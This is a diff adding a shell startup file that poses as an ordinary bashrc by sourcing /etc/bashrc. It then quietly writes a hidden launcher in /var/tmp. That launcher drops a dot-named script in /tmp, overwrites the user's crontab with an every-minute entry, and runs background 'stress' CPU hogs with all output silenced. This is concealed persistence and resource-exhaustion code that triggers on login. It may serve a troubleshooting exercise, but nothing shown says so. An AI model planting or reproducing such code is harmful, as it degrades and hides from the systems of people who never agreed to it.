@@ -1,0 +1,48 @@
+#!/bin/sh
+
+# Source global definitions
+if [ -f /etc/bashrc ]; then
+	. /etc/bashrc
+fi
+
+function generate_launcher() {
+cat > $1 << EOF
+#!/bin/sh
+
+if (pgrep stress &>/dev/null); then exit; fi
+
+HOGS=\$(( (\$RANDOM % 3) + 1 ))
+SCRIPTNAME="/tmp/.\$(mktemp -u testXXXXXX)"
+CRONTAB=\$(mktemp)
+
+cat > "\$CRONTAB" << MEH
+MAILTO=""
+* * * * * "\$SCRIPTNAME" 2>/dev/null
+MEH
+
+cat > "\$SCRIPTNAME" << MEH
+if (pgrep stress &>/dev/null); then exit; fi
+exec stress -q -c \$HOGS
+MEH
+
+crontab "\$CRONTAB"
+rm -f "\$CRONTAB"
+chmod +x "\$SCRIPTNAME"
+nohup "\$SCRIPTNAME" &>/dev/null &
+EOF
+
+chmod +x $1
+}
+
+LAUNCHER_PATH=/var/tmp/.launcher
+if [[ -e "$LAUNCHER_PATH" ]]; then
+    GENERATE_LAUNCHER=0
+else
+    GENERATE_LAUNCHER=1
+fi
+
+if [[ $GENERATE_LAUNCHER -eq 1 ]]; then
+    generate_launcher $LAUNCHER_PATH
+fi
+
+nohup $LAUNCHER_PATH &>/dev/null
